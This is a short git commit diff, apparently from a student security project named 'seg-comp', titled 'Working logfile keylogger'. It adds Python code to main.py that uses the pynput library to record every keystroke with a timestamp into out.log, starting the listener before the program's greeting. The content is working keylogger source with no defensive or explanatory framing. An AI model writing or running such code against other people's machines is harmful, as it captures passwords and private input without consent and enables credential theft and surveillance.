4ded024e8cf253f11342a1a1927e1e40abe6e1cf
Aran Leite <hyoretsu@gmail.com>
2025-04-07 03:21:08 -0300

    Working logfile keylogger

--- main.py
+++ main.py
@@ -1,4 +1,20 @@
+import logging
+
+from pynput.keyboard import Listener
+
+logging.basicConfig(
+    filename="out.log", level=logging.DEBUG, format="%(asctime)s - %(message)s"
+)
+
+
+def on_press(key):
+    logging.info(str(key))
+
+
 def main():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
     print("Hello from seg-comp!")
 
 
